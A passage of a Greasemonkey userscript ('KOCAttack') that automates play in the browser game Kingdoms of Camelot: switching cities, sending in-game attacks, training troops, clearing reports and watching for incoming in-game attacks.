		var enabledCities = 0;
		for(var i=0; ++i<=8;){
			if(t.options.okCities[i]){
				enabledCities++;
			}
		}
		if(enabledCities==1){ t.prevCurrentCity = -1; }
		t.SetCurrentAttackCityNum(cityA.id.replace("citysel_",""));
		t.nextAutoAttackWanted=window.setTimeout(function() {
			if(t.nextAutoAttackWanted!=null) {
				if(tries>4) {
					t.Log("Skip city, too many retries");
					t.NextAutoAttackCity();
					return;
				}
				t.Log("We clicked change city but the city did not change, trying again");
				t.ClickChangeCity(cityA,tries+1);
			}
		},10000);
},
//------------------------------------------------------------------------------------------------------------
NextAutoAttackCity:function() {
		var t=this;
		var autoAttack=t.GetAutoAttack();
		if(!autoAttack) return;
		if(t.IsCurrentlySendingMultipleWaves()){
			t.Log('Cannot change city. Waiting for multiple wave attack to finish...');
			t.ClearMultipleWaveTimeout();
			t.StartMultipleWaveTimer();
			return;
		}else{
			t.ClearMultipleWaveTimeout();
		}
		t.autoAttacksThisCity=0;
		var cityA=null;
		while(true) {
			t.autoAttackCityUpto++;
			cityA=t.ById('citysel_'+t.autoAttackCityUpto);
			if((cityA && cityA.className && cityA.className.indexOf('city_selected')>=0) || (!t.options.okCities[t.autoAttackCityUpto])) {
				t.Log('Skip city, current city or city not selected: '+t.autoAttackCityUpto);
			} else {
				t.Log('Attempting to select this city: '+t.autoAttackCityUpto);
				cityA=t.ById('citysel_'+t.autoAttackCityUpto);
				break;
			}
		}
		cityA=t.ById('citysel_'+t.autoAttackCityUpto);
		if(!cityA) {
			t.Log('Start from 1st city again');
			if(t.autoAttackCityUpto<=2) {
			} else {
				t.autoAttackCityUpto=1;
				cityA=t.ById('citysel_'+t.autoAttackCityUpto);
			}
			t.autoAttackCitiesDone++;
		}
		if(!cityA || t.autoAttackCitiesDone>=t.options.autoAttackCitiesDoneMax) {
			t.SetCurrentAttackCityNum(1);
			t.StartReloadPageTimer();
			return;
		} else {
			if(t.nextAutoAttackTimeout==null) {
				var secs=t.GetRandTime(1000*t.options.changeCitySecs);
				t.Log('Changing city to: '+t.autoAttackCityUpto+', in '+(secs/1000)+'secs, loop: '+t.autoAttackCitiesDone);
				t.nextAutoAttackTimeout=setTimeout(function() {
					t.nextAutoAttackTimeout=null;
					t.SetValuesCache();
					t.ClickChangeCity(cityA,0);
				},secs);
			} else {
				t.Log('Cannot change city. Reason: about to attack or change city');
			}
		}
},
//------------------------------------------------------------------------------------------------------------
StopWaitForAttackBoxAppear:function() {
		if(this.waitForAttackBoxAppear!=null) {
			window.clearTimeout(this.waitForAttackBoxAppear);
			this.waitForAttackBoxAppear=null;
		}
},
//------------------------------------------------------------------------------------------------------------
OpenAttackDialog:function(bestAttack) {
		var t=this;
		t.StopWaitForAttackBoxAppear();
		t.waitForAttackBoxAppear=window.setTimeout(function() {
			if(t.waitForAttackBoxAppear==null) return;
			t.waitForAttackBoxAppear=null;
			t.DoUnsafeWindow('Modal.hideModalAll();');
			t.DoUnsafeWindow('Modal.hideModalAll();');
			try {
				t.DoUnsafeWindow('Modal.hideCurtain();');
				t.DoUnsafeWindow('Modal.hideWindow();');
			} catch(e) {
				}
			t.ResetIdStatus();
			t.Log("Attack box has not appeared, let's reopen");
			window.setTimeout(function() {
				t.OpenAttackDialog(bestAttack);
			},0);
		},5*1000);
		if(t.ById('modal_attack')) {
			try {
				for(var countOut=10;countOut-->=0;) {
					t.Log('modal attck still up'+unsafeWindow.Modal.modalid);
					var maxi=0;
					for(var i=-1; ++i<20;) {
						if(t.ById('modalBox'+i)) {
							maxi=i;
						}
					}
					t.Log('Closing: '+maxi);
					unsafeWindow.Modal.modalid=maxi;
					if(maxi>0) {
						unsafeWindow.Modal.hideCurtain();
						unsafeWindow.Modal.hideWindow();
					} else {
						break;
					}
				}
			}catch(e) {
				t.Log("Mmm..."+e);
			}
		} else {
			unsafeWindow.Modal.hideModalAll();
		}
		if (bestAttack.type==0) {
			unsafeWindow.modal_attack(4,bestAttack.x,bestAttack.y);
			t.ToggleCurrenttAttackWaveType(bestAttack.x,bestAttack.y);
			t.UpdateAttackLastSentTime();
		} else if (bestAttack.type==1) {
			unsafeWindow.modal_attack(1,bestAttack.x,bestAttack.y);
		}
},
//------------------------------------------------------------------------------------------------------------
nextAutoAttackWanted:null,
NextAutoAttack:function() {
		var t=this;
		t.Log("Next auto attack");
		if(t.nextAutoAttackWanted!=null) {
			window.clearTimeout(t.nextAutoAttackWanted);
			t.nextAutoAttackWanted=null;
		}
		var autoAttack=t.GetAutoAttack();
		if(!t.options.okCities[t.autoAttackCityUpto]) {
			t.Log('Skip city. Not enabled in options. City: '+t.autoAttackCityUpto);
			t.NextAutoAttackCity();
			return;
		}
		if(!autoAttack || (autoAttack.x!=undefined && autoAttack.x!=-1)) return;
		if(t.IsMapperRunning()) {
			t.StartReloadPageTimer();
			return;
		}
		t.DetermineCurrentRallyPointLevel();
		t.DetermineCurrentMarchesNum();
		t.available_marches_num = t.currentRallyPointLevel - t.currentMarchesNum - t.options.rallyKeep;
		var currentTroops=t.GetArmySize();
		var currentResources=t.GetResourcesSize();
		var mapCoord=t.GetCurrentMapCoord();
		var attacks=t.GetClosestAttacks(mapCoord.x,mapCoord.y);
		var bestAttack=t.FindBiggestCampAttack(attacks,currentTroops,currentResources);
		if(bestAttack && t.available_marches_num>0) {
			autoAttack.x=bestAttack.x;
			autoAttack.y=bestAttack.y;
			t.SetAutoAttack(autoAttack);
			t.autoAttackModalWaiting=true;
			var waitedCount=0;
			var startAttack=function() {
				waitedCount++;
				if(waitedCount>20) {
					t.Log('Force close the attack dialog');
					t.DoUnsafeWindow('Modal.hideModalAll();');
				}
				var attackBox=document.getElementById('modal_attack');
				if(!attackBox) {
					t.OpenAttackDialog(bestAttack);
					return;
				}
				window.setTimeout(function() {
					startAttack();
				},1000);
			}
			startAttack();
		} else {
			autoAttack.x=autoAttack.y=-1;
			t.SetAutoAttack(autoAttack);
			t.Log("No valid targets, need to attack more targets or wait for troops to return.");
			t.NextAutoAttackCity();
		}
},
//------------------------------------------------------------------------------------------------------------
RemoveEmptyReportsDivs:function() {
		var ss=document.evaluate("./div[@id='modal_msg_reports_tablediv']",document.body,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
		for(var s=-1,j=ss.snapshotLength; ++s<j;) {
			var div=ss.snapshotItem(s);
			if(div.innerHTML=="") {
				div.parentNode.removeChild(div);
			}
		}
},
//------------------------------------------------------------------------------------------------------------
IterateAllianceReports:function(f) {
		return this.IterateReports('modal_alliance_reports_tablediv',0,f);
},
//------------------------------------------------------------------------------------------------------------
IterateMsgReports:function(f) {
		return this.IterateReports('modal_msg_reports_tablediv',1,f);
},
//------------------------------------------------------------------------------------------------------------
IterateReports:function(id,colStart,f) {
		this.RemoveEmptyReportsDivs();
		var msgs=this.ById(id);
		if(!msgs) return;
		var trs=msgs.getElementsByTagName('tr');
		for(var tUpto=-1,j=trs.length; ++tUpto<j;) {
			var tr=trs[tUpto];
			var a=this.FindByXPath(tr,".//a[contains(@onclick,'modal_messages_viewreports') or contains(@onclick,'modal_alliance_report_view') or contains(@onclick,'viewMarchReport')]");
			if(!a) continue;
			if(tr.cells.length<(colStart+2)) continue;
			var descCol=tr.cells[colStart+1];
			var dateCol=tr.cells[colStart+0];
			var desc=descCol.textContent;
			var m=this.coordsRe.exec(desc);
			var x=null,y=null;
			if(m) {
				x=m[1]; y=m[2];
			}
			var onclick=a.getAttribute('onclick');
			if(onclick) {
				var m=this.onclickReportRe.exec(onclick);
				if(m) { x=m[11]; y=m[12]; }
			}

			if(!f.call(this,a,tr,desc,x,y)) break;
		}
},
//------------------------------------------------------------------------------------------------------------
recordingReports:false,
replaceReturnRe:/return[^{}]*$/,
RecordReports:function() {
		try {
			if(this.recordingReports) return;
			this.recordingReports=true;
			this.IterateMsgReports(function(a,tr,desc,x,y) {
				if(x==null || y==null) return true;
				var onclick=a.getAttribute('onclick').trim();
				if(this.IsOnclickMyselfToMyself(onclick)) {
					return true;
				}
				var attack=this.GetAttack(x,y);

				var saveReportAsAttack = true;
				if(!attack) {
					var saveReportAsAttack = false;
				}

				if(!attack) { attack={}; }

				if(!attack.messages) attack.messages=[];
				var onclickWithoutReturn=onclick.replace(this.replaceReturnRe,'');
				a.href='javascript:'+onclickWithoutReturn;
				onclick=this.FixOnClick(onclick);
				var addedAlready=false;
				for(var m=-1,j=attack.messages.length; ++m<j;) {
					if(attack.messages[m][1]==onclick) {
						addedAlready=true;
						break;
					}
				}

				var changed=false;
				if(!addedAlready) {
					attack.messages.push([desc,onclick]);
					var li=this.GetLevelInfo(attack);
					if(li) attack.levelInfo=li;
					changed=true;
				}
				if(!attack.levelInfo) {
					attack.levelInfo=this.GetLevelInfo(attack);
					if(attack.levelInfo) changed=true;
				}
				if(changed && saveReportAsAttack) {
					this.SetAttack(x,y,attack);
				}
				return true;
			});
		} finally {
			this.recordingReports=false;
		}
},
//------------------------------------------------------------------------------------------------------------
IsOnclickMyselfToMyself:function(onclick) {
		if(!onclick) return false;
		var m=this.onclickReportRe.exec(onclick);
		if(m && m[6]==m[8] && m[7]==m[9]) {
			return true;
		}
		return false;
},
//------------------------------------------------------------------------------------------------------------
DeleteWildBarbAttacks:function() {
		var deletes=0;
		this.IterateMsgReports(function(a,tr,desc,x,y) {
			var onclick=a.getAttribute('onclick');
			if(!onclick) return false;
			onclick=onclick.trim();
			var m=this.onclickReportRe.exec(onclick);
			if(this.IsOnclickMyselfToMyself(onclick)) {
			} else if(m && m[5]!='0') {
				return true;
			}
			var inps=tr.getElementsByTagName('input');
			if(inps.length>=1) {
				inps[0].checked=true;
			}

			deletes++;
			return true;
		});
		if(deletes>0) {
			this.DoUnsafeWindow('modal_messages_reports_chkdel();');
		}
		return deletes;
},
//------------------------------------------------------------------------------------------------------------
//DeleteFarmAttacks:function() {
//		var deletes=0;
//		this.IterateMsgReports(function(a,tr,desc,x,y) {
//			var DisplayName = this.GetDisplayName();
//			DisplayName = /([^"]+) ([^"]+)/.exec(DisplayName);
//			var onclick=a.getAttribute('onclick');
//			if(!onclick) return false;
//			onclick=onclick.trim();
//			var m=this.onclickReportRe.exec(onclick);
//			if(this.IsOnclickMyselfToMyself(onclick)) {
//				return true;
//			} else if(m && m[5]=='0') {
//				return true;
//			} else if(m && m[11]=='0' && m[12]=='0') {
//				return true;
//			} else if(m && m[8].StripQuotes()!=DisplayName[2])  {
//				return true;
//			}
//			var attack = this.GetAttack(m[11],m[12]);
//			if(!attack)	return true;
//			if(attack.deletefarmno) return true;
//			if(!attack.troops) return true;
//			var inps=tr.getElementsByTagName('input');
//			if(inps.length>=1) {
//				inps[0].checked=true;
//			}
//			deletes++;
//			return true;
//		});
//		if(deletes>0) {
//			this.DoUnsafeWindow('modal_messages_reports_chkdel();');
//		}
//		return deletes;
//	},
//------------------------------------------------------------------------------------------------------------
bringUpReports:false,
AddCheckBarbarians:function() {
		var t=this;
		var msgBody=t.ById('modal_msg_reports_tablediv');
		if(!msgBody) return;
		var closeReports=true;
		if(t.autoAttackRemoveReports) {
			var reportsRemoved=0;
			if(t.options.autoRemoveReports){
				reportsRemoved+=t.DeleteWildBarbAttacks();
			}
			if(t.options.autoRemoveFarmReports){
				reportsRemoved+=t.DeleteFarmAttacks();
			}
			if(reportsRemoved==0) {
				t.autoAttackRemoveReports=false;
			} else {
				closeReports=false;
			}
		}
		if(t.bringUpReports && closeReports) {
			window.setTimeout(function() {
				t.DoUnsafeWindow('Modal.hideModalAll();');
			},t.GetRandTime(3000));
			t.bringUpReports=false;
		}
		t.ClearMessages();
		var a=document.createElement('a');
		a.addEventListener('click',function() {
			t.DeleteWildBarbAttacks();
		},false);
		a.className='buttonDown20';
		a.innerHTML='<span>Delete Wild/Barb/Transp</span>';
		if(msgBody.nextSibling) {
			msgBody.nextSibling.insertBefore(a,msgBody.nextSibling.childNodes[0]);
		} else {
			msgBody.appendChild(a);
		}
		var a=document.createElement('a');
		a.addEventListener('click',function() {
			t.DeleteFarmAttacks();
		},false);
		a.className='buttonDown20';
		a.innerHTML='<span>Delete Farm</span>';
		if(msgBody.nextSibling) {
			msgBody.nextSibling.insertBefore(a,msgBody.nextSibling.childNodes[0]);
		} else {
			msgBody.appendChild(a);
		}
},
//------------------------------------------------------------------------------------------------------------
HighlightAllianceReports:function() {
		var mapCoord=this.GetCurrentMapCoord();
		var cities=this.GetSeed().cities;
		this.IterateAllianceReports(function(a,tr,desc,x,y) {
			if(x==null || y==null) return true;
			var closestDist=999999;
			var closestLoc=null;
			for(var c=-1,j=cities.length; ++c<j;) {
				var city=cities[c];
				var cityLoc={'x':city[2],'y':city[3]};
				var dist=this.CalcXYDist({'x':x,'y':y},cityLoc);
				if(dist<closestDist) { closestDist=dist; closestLoc=cityLoc; }
			}
			var onclick=a.getAttribute('onclick');
			var m=this.onclickReportRe.exec(onclick);
			if(m && m[5]=='0') {
				tr.cells[1].style.color='#888';
			}
			if(closestLoc!=null) {
				var td=tr.insertCell(-1);
				td.style.textAlign='right';
				var loctd=tr.insertCell(-1);
				this.AddText(loctd,closestLoc.x+','+closestLoc.y);
				this.AddText(td,Math.floor(closestDist) );
			}
			return true;
		});
},
//------------------------------------------------------------------------------------------------------------
IterateAttacks:function(f) {
		if(this.isChrome) {
			return;
		}
		var names=this.browser_listValues();
		var attackPrefix='attack_'+this.GetServerId()+'_';
		for(var n=-1,j=names.length; ++n<j;) {
			var name=names[n];
			if(name.substring(0,attackPrefix.length)!=attackPrefix) continue;
			f(name,this.browser_getValue(name));
		}
},
//------------------------------------------------------------------------------------------------------------
prevClearMessages:0,
ClearMessages:function() {
		var t=this;
		var nowSecs=new Date().getTime()/1000;
		if((t.prevClearMessages+(10*60)) > nowSecs) {
			return;
		}
		t.prevClearMessages=nowSecs;
		var keepReports=t.isChrome?t.options.chromeKeepReports:t.options.keepReports;
		t.Log('Clear old messages, keeping '+keepReports);
		if(keepReports<=0) {
			keepReports=1;
		}
		t.IterateAttacks(function(name,value) {
			var attack=JSON2.parse(value);
			if(attack.messages && attack.messages.length>keepReports) {
				attack.messages.splice(0,attack.messages.length-keepReports+1);
			}
			t.browser_setValue(name,JSON2.stringify(attack));
		});
	},
//------------------------------------------------------------------------------------------------------------
SetupClearMessages:function() {
		var t=this;
		var cm=document.createElement('input');
		cm.type='button';
		cm.id='ClearMessages';
		cm.style.display='none';
		document.body.appendChild(cm);
		cm.addEventListener('click',function(e) {
			setTimeout(function() {
				t.ClearMessages();
			},0);
		},false);
},
//------------------------------------------------------------------------------------------------------------
trainTroopsOnclick:/\(([0-9]+)\)/,
	AddTrainTroopsLink:function() {
		var t=this;
		var startObj=t.ById('unit_btns_start');
		if(!startObj) return;
		var onclick=startObj.getAttribute('onclick');
		var m=t.trainTroopsOnclick.exec(onclick);
		if(!m) {
			return;
		}
		var type=m[1];
		var pnode=startObj.parentNode;
		var a=document.createElement('a');
		a.className='button25';
		var setTrainTroopsA=function() {
			var trainTroops=JSON2.parse(t.GetValue('TrainTroops','{}'));
			a.innerHTML='<span>'+(trainTroops[t.GetCurrentCityId()]==type?'Auto Train - On':'Auto Train - Off')+'</span>';
		}
		a.addEventListener('click',function() {
			var trainTroops=JSON2.parse(t.GetValue('TrainTroops','{}'));
			trainTroops[t.GetCurrentCityId()]=trainTroops[t.GetCurrentCityId()]==type?undefined:type;
			t.SetValue('TrainTroops',JSON2.stringify(trainTroops));
			setTrainTroopsA();
		},false);
		setTrainTroopsA();

		t.AddText(pnode,' ');
		pnode.appendChild(a);
},
//------------------------------------------------------------------------------------------------------------
GetCurrentCityId:function() {
		if(!unsafeWindow.currentcityid) return null;
		return unsafeWindow.currentcityid;
},
//------------------------------------------------------------------------------------------------------------
GetCurrentAttackCityNum:function() {
		var curCityNum=this.GetValue('CurrentAttackCityNum',null);
		if(!curCityNum || !this.is_int(curCityNum) || curCityNum>8){
			curCityNum=1;
		}
		return curCityNum;
},
//------------------------------------------------------------------------------------------------------------
SetCurrentAttackCityNum:function(curCityNum) {
		if(!curCityNum){
			var curCityNum = 1;
		}
		this.SetValue('CurrentAttackCityNum',curCityNum);
		return curCityNum;
},
//------------------------------------------------------------------------------------------------------------
getCityBuilding: function(cityId, buildingId){
	  var b = unsafeWindow.seed.buildings['city'+cityId];
	  var ret = {count:0, maxLevel:0};
	  for (var i=0; ++i<33;){
		if (b['pos'+i] && b['pos'+i][0] == buildingId){
		  ++ret.count;
		  if (parseInt(b['pos'+i][1]) > ret.maxLevel)
			ret.maxLevel = parseInt(b['pos'+i][1]);
		}
	  }
	  return ret;
},
//------------------------------------------------------------------------------------------------------------
lastTrainTroops:{},
CheckTrainTroops:function() {
		var t=this;
		if(!t.GetSeed()) return;
		var cityid=t.GetCurrentCityId();
		var trainTroops=JSON2.parse(t.GetValue('TrainTroops','{}'));
		if(!trainTroops || !trainTroops[cityid]) {
			return;
		}
		var trainTroopId=trainTroops[cityid];
		var popAvail=parseInt(unsafeWindow.seed.citystats["city" +cityid ]["pop"][0]);
		var popTotal=parseInt(unsafeWindow.seed.citystats["city" + cityid]["pop"][1]);
		var labourTotal=parseInt(unsafeWindow.seed.citystats["city" + cityid]["pop"][3]);
		var idleTotal=popTotal-labourTotal;
		var popNeeded=((t.options.percentOfPopToTrain/100)*idleTotal)+labourTotal;
		var availableTrainingSlots = 0;
		try{
			var barracksTotal = t.getCityBuilding(cityid, 13).count;
			var trainingSlotsUsed = unsafeWindow.seed.queue_unt['city'+cityid].length;
			if(trainingSlotsUsed!=null){
				var availableTrainingSlots = barracksTotal-trainingSlotsUsed;
			}
		}finally{
			if(availableTrainingSlots<1){ return false; }
		}
		if(popAvail>0 && popAvail>=popNeeded) {
			var lastTrain=t.lastTrainTroops[cityid];
			var nowSecs=new Date().getTime()/1000;
			if(nowSecs<(lastTrain+(3*60))) { return; }
			var startButton=t.ById('unit_btns_start');
			if(!startButton) {
				t.DoUnsafeWindow('modal_barracks_train('+trainTroopId+');')
				return;
			}
			var onclick=startButton.getAttribute('onclick');
			var onclickM=/\(([0-9]+)\)/.exec(onclick);
			if(!onclickM || trainTroopId!=onclickM[1]) {
				return;
			}
			t.lastTrainTroops[cityid]=nowSecs;
			var numInp=t.ById('modal_barracks_num');
			var maxObj=t.ById('modal_barracks_max_num');

			if(numInp && maxObj) {
				numInp.value=Math.floor(parseInt(maxObj.textContent)*(parseInt(t.options.percentToTrainOfMax)/100));
				window.setTimeout(function() {
					if(numInp.value>parseInt(maxObj.textContent)) {
						t.Log('Not training troops:'+numInp.value+'>'+maxObj.textContent);
						return;
					}
					onclick=onclick.replace('return false;','');
					window.setTimeout(function() {
						eval('unsafeWindow.'+onclick);
					},t.GetRandTime(500));
				},t.GetRandTime(500));
			}
		}
},
//------------------------------------------------------------------------------------------------------------
DetermineCurrentPage:function() {
		if(unsafeWindow.location.href.match(/kingdomsofcamelot\.com\/fb\/.*?\/standAlone\.php/i)){
			this.currentPage = 'kabam_page';
		}else if(unsafeWindow.location.href.match(/kingdomsofcamelot\.com\/fb\/.*?\/src\/main_src\.php/i)){
			this.currentPage = "koc_game";
		}else if (unsafeWindow.location.href.match(/apps\.facebook\.com\/kingdomsofcamelot\/.*?page=nogame/i)) {
			this.currentPage = "domain_selection_app_page";
		}else if (unsafeWindow.location.href.match(/apps\.facebook\.com\/kingdomsofcamelot/i)) {
			this.currentPage = "app_page";
		}
//		else if (unsafeWindow.location.href.match(/facebook.com\/connect\/uiserver.php/i)) {
//			this.currentPage = "facebook_popup";}
			else if(unsafeWindow.location.href.match(/kingdomsofcamelot\.com\/fb\/.*?\/src\/newgame_src\.php/i)){
			this.currentPage = "domain_selection";
		}else if(unsafeWindow.location.href.match(/facebook.com\/4oh4.php/i)){
			window.location.href = window.location.protocol+'//apps.facebook.com/kingdomsofcamelot/?ref=ts';
		}else{
			this.currentPage = "unknown";
		}
		return this.currentPage;
},
//------------------------------------------------------------------------------------------------------------
OnImpendingAttack:function() {
		var t=this;
		t.Log("impending attack");
		var autoAttack=t.GetAutoAttack();
		var url=t.options.impendingAttackUrl;
		if(url!=undefined && url !="") {
			GM_openInTab(url);
		}
		if(t.options.impendingStopAttack){
			if(autoAttack){
				t.ToggleAutoAttack();
			}
		}
},
//------------------------------------------------------------------------------------------------------------
	CheckImpendingAttack:function() {
		var t=this;
		var r=false;
		var seed=t.GetSeed();
		if(seed && seed.queue_atkinc) {
		  for(var k in seed.queue_atkinc){
			m = seed.queue_atkinc[k];
			if (m.marchType==3 || m.marchType==4){
				var q=0;
				var keys=unsafeWindow.Object.keys(seed.queue_atkinc);
					if(keys.length>0 && keys.length<16) {
						r=true;
					}
				}
			}
		}
		var impendingAttack=t.GetValue('ImpendingAttack',false);
		if(!impendingAttack && r) {
			window.setTimeout(function() {
				t.OnImpendingAttack();
			},0);
		}
		t.SetValue('ImpendingAttack',r);
		return r;
},
//------------------------------------------------------------------------------------------------------------
FactoryReset:function() {
		var names=this.browser_listValues();
		for(var n=-1,j=names.length; ++n<j;) {
			this.browser_setValue(names[n],null);
		}
		this.SetOptions({});
},
//------------------------------------------------------------------------------------------------------------
FactoryResetCurrentServer:function() {
		var names=this.browser_listValues();
		var serverId=this.GetServerId();
		for(var n=-1,j=names.length; ++n<j;) {
			var name=names[n];
			var sid=this.GetServerIdFromName(name);
			if(sid!=serverId) continue;
			this.browser_setValue(name,null);
		}
},
//------------------------------------------------------------------------------------------------------------
GetServerIdFromName:function(n) {
		var nArr=n.split('_');
		if(nArr.length<2) return null;
		return nArr[1];
},
//------------------------------------------------------------------------------------------------------------
DeleteAllStoredAttacks:function() {
		var t=this;
		t.IterateAttacks(function(name,value) {
			var nameI=name.split('_');
			if(nameI.length<3) return;
			var xy=nameI[2].split(',');
			if(value=="") return;
			var attack=JSON2.parse(value);
			if(!attack) return;
			var attackX = xy[0];
			var attackY = xy[1];
			if(attackX && attackY){
				t.DeleteAttack(attackX, attackY);
			}
			return true;
		});
		window.alert("All stored attacks for this domain have been deleted.\nClick the ok button to reload.");
},
//------------------------------------------------------------------------------------------------------------
DeleteTransports:function() {
		var t=this;
		t.IterateAttacks(function(name,value) {
			var nameI=name.split('_');
			if(nameI.length<3) return;
			var xy=nameI[2].split(',');
			if(value=="") return;
			var attack=JSON2.parse(value);
			if(!attack) return;
			var attackX = xy[0];
			var attackY = xy[1];
			if(attack.type == 1){
			t.DeleteAttack(attackX, attackY);
			}
			return true;
		});
		window.alert("All stored transports for this domain have been deleted.\nClick the ok button to reload.");
},
//------------------------------------------------------------------------------------------------------------
ListTransports:function() {
		var t=this;
		var fTransport = 0;
		t.IterateAttacks(function(name,value) {
			var nameI=name.split('_');
			if(nameI.length<3) return;
			var xy=nameI[2].split(',');
			if(value=="") return;
			var attack=JSON2.parse(value);
			if(attack.type == 1){
				WinLog.write ("Name: "+name+" Value: "+value);
				fTransport = 1;
				return true;
			}
		});
		if (!fTransport){
			WinLog.write ("No Transports Found\n");
			return true;
		}
},
//------------------------------------------------------------------------------------------------------------
ListAttacks:function() {
		var t=this;
		t.IterateAttacks(function(name,value) {
			WinLog.write (name+" "+value);
			return true;
		});
},
//------------------------------------------------------------------------------------------------------------
DetailAttacks:function() {
	  var t=this;
	  var names=GM_listValues();
	  var currentServerId = t.GetServerId();
	  var attackPrefix='attack_'+currentServerId+'_';
	  for(var n=-1,j=names.length; ++n<j;) {
		var name=names[n];
		var nameI=name.split('_');
		if(nameI.length<3) continue;
		var xy=nameI[2].split(',');
		if(name.substring(0,attackPrefix.length)!=attackPrefix) continue;
		var value = GM_getValue(name);
		if(value=="") continue;
		var attack=JSON2.parse(value);
		attack.xy=xy;
		if(!attack) continue;
		t.attacks.push(attack);
	  }
},
//------------------------------------------------------------------------------------------------------------
ExportAllToJSON:function() {
		var names=this.browser_listValues();
		var obj={};
		var serverId=this.GetServerId();
		for(var n=-1,j=names.length; ++n<j;) {
			var name=names[n];
			var sid=this.GetServerIdFromName(name);
			if(sid!=serverId) continue;
			var v=this.browser_getValue(name,null);
			if(v!=null && v!=undefined && v!="")
				obj[name]=v;
		}
		return JSON2.stringify(obj);
},
//------------------------------------------------------------------------------------------------------------
ImportAllFromJSON:function(json) {
		try {
			var obj=JSON2.parse(json);
			if(!obj) { return; }
			this.FactoryResetCurrentServer();
			var serverId=this.GetServerId();
			for(var name in obj) {
				var sid=this.GetServerIdFromName(name);
				if(sid!=serverId) continue;
				this.browser_setValue(name,obj[name]);
			}
		} catch(e) {
			window.alert('Import failed'+e);
		}
},
//------------------------------------------------------------------------------------------------------------
SetupMenu:function() {
		var t=this;
		GM_registerMenuCommand('KOCAttack - Options',function() {
			t.ShowOptionsDialog();
		});
		GM_registerMenuCommand('KOCAttack - View Attacks',function() {
			t.ShowViewAttacksDialog();
		});
		GM_registerMenuCommand('KOCAttack - Import/Export',function() {
			t.ShowImportExportBox();
		});

		GM_registerMenuCommand('KOCAttack - Auto Attack',function() {
			t.ToggleAutoAttack();
		});
		GM_registerMenuCommand('KOCAttack - Factory Reset!',function() {
			t.FactoryReset();
		});
},
//------------------------------------------------------------------------------------------------------------
pageLoaded:false,
prevCurrentCity:-1,
currentAttackCityResumed:false,
//inviteFriendsTabHidden:false,
idStatus:{},
ResetIdStatus:function() {
		this.idStatus={};
},
//------------------------------------------------------------------------------------------------------------
Listen:function() {
		var t=this;
		t.SetupMenu();
		t.GetValuesCache();
		t.ResetAutoAttackTarget();
		t.options=t.GetOptions();
		t.startListenTime=new Date();
		t.DetermineCurrentPage();
		if(t.currentPage == "koc_game"){
			setTimeout(function(){checkStrngMag.checkStrangeMagic();},15000);
			window.setTimeout(function() {
				if(!t.pageLoaded && t.GetAutoAttack() && !t.IsMapperRunning()) {
					GM_log("whoops, game not loaded after 60 secs problem. reloading.");
					t.SetValuesCache();
					t.ReloadWindow();
				}
			},t.GetRandTime(60*1000));
			if(t.GetAutoAttack()) {
				window.setTimeout(function() {
					if(unsafeWindow.poctoggletimer && unsafeWindow.ispaused) {
						unsafeWindow.poctoggletimer();
					}
				},5000);
			}
//			if(!t.inviteFriendsTabHidden && t.options.disableInviteFriends){
//				var tabBar=t.ById("main_engagement_tabs");
//				if(tabBar){
//					var inviteFriendsTab=t.FindByXPath(tabBar,".//a[contains(@onclick,'invite_friends_popup')]");
//					if(inviteFriendsTab){
//						inviteFriendsTab.style.display="none";
//						t.inviteFriendsTabHidden = true;
//					}
//				}
//			}
		}
		var domTickTimer=null;
		var domTickUpto=0;
		var domTick=function(e) {
			var funcsById={};
			if (t.currentPage == "domain_selection" || t.currentPage == "domain_selection_app_page"){
				if((domTickUpto%20)==0) {
					t.HandleCrossIframeCommands();
				}
			}
			if (t.currentPage == 'kabam_page'){
				return;
			}
			if(t.currentPage == "koc_game"){
				var cityId=t.GetCurrentCityId();
				var cityChanged=cityId!=t.prevCurrentCity?true:false;
				if(cityChanged) {
					t.prevCurrentCity=cityId;
				}
				if(!t.currentAttackCityResumed){
					var currentAttackCityNum = t.GetCurrentAttackCityNum();
					var currentAttackCity=t.ById('citysel_'+currentAttackCityNum);
					if(currentAttackCity){
						if(currentAttackCityNum>1){
							t.Log('Changing to last city before refresh:'+currentAttackCityNum);
							t.autoAttackCityUpto = currentAttackCityNum;
							t.ClickChangeCity(currentAttackCity,0);
						}
						t.currentAttackCityResumed = true;
					}
				}
//				if((domTickUpto%10)==0) {
//					t.HandleChatPane();
//				}
				if((domTickUpto%20)==0) {
					t.CheckImpendingAttack();
				}
				if(cityChanged && cityId!=null) {
					setTimeout(function() {
						t.AddOptionsLink();
						t.DrawClosestFarms();
						t.AddViewAttacksLink();
					},0);
					setTimeout(function() {
						t.DetermineCurrentRallyPointLevel();
						t.DetermineCurrentMarchesNum();
						t.CheckAutoRaiseGold();
						t.CheckAbandonWilds();
						t.CheckTrainTroops();
					},1000);
					setTimeout(function() {
						t.CheckReports();
					},3000);
					setTimeout(function() {
						t.NextAutoAttack();
					},5000);
				}
				funcsById={
					'castleModalTabs':function(target) {
						t.OnCastleBoxAppear(target.parentNode);
					},
					'marketmain_bdy':function(target) {
						t.OnMarketBoxAppear(target);
					},
					'modal_attack':function(target) {
						window.setTimeout(function() {
							t.OnAttackBoxAppear(target);
						},250);
					},
					'barracks_train':function(target) {
						t.AddTrainTroopsLink();
						t.CheckTrainTroops();
					},
					'modal_speedup':function(target) {
						t.ClickShareToWall(target);
					},
					'invitePopup':function(target) {
						if(t.options.disableInviteFriends && false){
							target.parentNode.removeChild(target);
						}
					},
				};
			}
			funcsById.RES_ID_fb_pop_dialog_table = function(target){
				if (t.currentPage == "koc_game") {
					if(t.currentServerId>0 && t.currentPage == "koc_game"){
						GM_setValue("KOCAttackLastKnownServerID", t.currentServerId);
					}
				}
			}
//			if(t.currentPage == "facebook_popup"){
//				if((domTickUpto%20)==0) {
//					t.HandlePublishPopup();
//				}
//			}
			if(t.currentPage == "domain_selection" && t.options.autoLogBackIn){
				if((domTickUpto%20)==0) {
					t.HandleDomainLogin();
				}
			}
			var funcCalled=0;
			if(funcCalled==0) {
				for(var id in funcsById) {
					var f=funcsById[id];
					var div=t.ById(id);
					if(!t.idStatus[id] && div) {
						var fcall=function(func,d) {
							funcCalled++;
							setTimeout(function() {
								try {
									func(d);
								} finally {
									funcCalled--;
								}
							},0);
						}
						fcall(f,div);

					}
					var divStatus=div?true:false;
					if(divStatus!=t.idStatus[id]) {
					}
					t.idStatus[id]=divStatus;
				}
			}
			if(!domTickTimer) {
				domTickTimer=window.setTimeout(function() {
					domTickTimer=null;
					domTick();
					domTickUpto++;
				},250);
			}
		};
		var withinDomInserted=false;
		if(document.body){
			document.body.addEventListener('DOMNodeInserted',function(e) {
				if(withinDomInserted) return;
				var isStatuses=(e.target.className && e.target.className=='statues')?true:false;
				if(isStatuses){
